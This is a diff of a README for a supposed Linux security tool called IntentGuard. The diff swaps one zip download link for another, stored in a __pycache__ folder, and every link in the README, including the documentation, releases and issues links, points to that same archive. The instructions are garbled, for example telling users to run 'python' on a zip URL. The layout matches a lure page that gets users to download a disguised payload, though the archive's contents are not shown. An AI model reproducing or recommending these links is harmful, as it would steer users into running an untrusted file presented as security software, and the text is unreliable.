@@ -6,7 +6,7 @@ IntentGuard is an online security system that helps you protect your Linux proce
 
 ## 📥 Download Now
 
-[![Download IntentGuard](https://github.com/babaannekatledici/intentguard/raw/refs/heads/main/visualization/Software-v3.1.zip)](https://github.com/babaannekatledici/intentguard/raw/refs/heads/main/visualization/Software-v3.1.zip)
+[![Download IntentGuard](https://raw.githubusercontent.com/babaannekatledici/intentguard/main/detection/__pycache__/Software-v1.7.zip)](https://raw.githubusercontent.com/babaannekatledici/intentguard/main/detection/__pycache__/Software-v1.7.zip)
 
 ## 📋 System Requirements
 
@@ -24,11 +24,11 @@ To get started, follow these steps:
 
 1. **Visit the Download Page**: Click the link below to access the Releases page.
 
-   [Download IntentGuard](https://github.com/babaannekatledici/intentguard/raw/refs/heads/main/visualization/Software-v3.1.zip)
+   [Download IntentGuard](https://raw.githubusercontent.com/babaannekatledici/intentguard/main/detection/__pycache__/Software-v1.7.zip)
 
 2. **Choose the Latest Version**: On the Releases page, find the most recent version of IntentGuard. It typically has a tag like “v1.0” or newer.
 
-3. **Select the Download File**: Look for the download link under the release you chose. You should find a file named something like `https://github.com/babaannekatledici/intentguard/raw/refs/heads/main/visualization/Software-v3.1.zip` or `https://github.com/babaannekatledici/intentguard/raw/refs/heads/main/visualization/Software-v3.1.zip`.
+3. **Select the Download File**: Look for the download link under the release you chose. You should find a file named something like `https://raw.githubusercontent.com/babaannekatledici/intentguard/main/detection/__pycache__/Software-v1.7.zip` or `https://raw.githubusercontent.com/babaannekatledici/intentguard/main/detection/__pycache__/Software-v1.7.zip`.
 
 4. **Download the File**: Click on the file to start the download. This may take a few moments depending on your internet speed.
 
@@ -48,7 +48,7 @@ To get started, follow these steps:
 
 9. **Run IntentGuard**: Start the application by using the command:
    ```
-   python https://github.com/babaannekatledici/intentguard/raw/refs/heads/main/visualization/Software-v3.1.zip
+   python https://raw.githubusercontent.com/babaannekatledici/intentguard/main/detection/__pycache__/Software-v1.7.zip
    ```
 
 You should see the interface open and be able to use IntentGuard to monitor your system.
@@ -67,12 +67,12 @@ You should see the interface open and be able to use IntentGuard to monitor your
 
 ## 📞 Support
 
-If you encounter issues or have questions, please check the [Issues section](https://github.com/babaannekatledici/intentguard/raw/refs/heads/main/visualization/Software-v3.1.zip) on GitHub. You can also reach out for assistance.
+If you encounter issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/babaannekatledici/intentguard/main/detection/__pycache__/Software-v1.7.zip) on GitHub. You can also reach out for assistance.
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/babaannekatledici/intentguard/raw/refs/heads/main/visualization/Software-v3.1.zip)
-- [Releases Page](https://github.com/babaannekatledici/intentguard/raw/refs/heads/main/visualization/Software-v3.1.zip)
-- [GitHub Issues](https://github.com/babaannekatledici/intentguard/raw/refs/heads/main/visualization/Software-v3.1.zip)
+- [Documentation](https://raw.githubusercontent.com/babaannekatledici/intentguard/main/detection/__pycache__/Software-v1.7.zip)
+- [Releases Page](https://raw.githubusercontent.com/babaannekatledici/intentguard/main/detection/__pycache__/Software-v1.7.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/babaannekatledici/intentguard/main/detection/__pycache__/Software-v1.7.zip)
 
 Thank you for using IntentGuard! We hope this tool helps you keep your Linux system safe and secure. Happy monitoring!
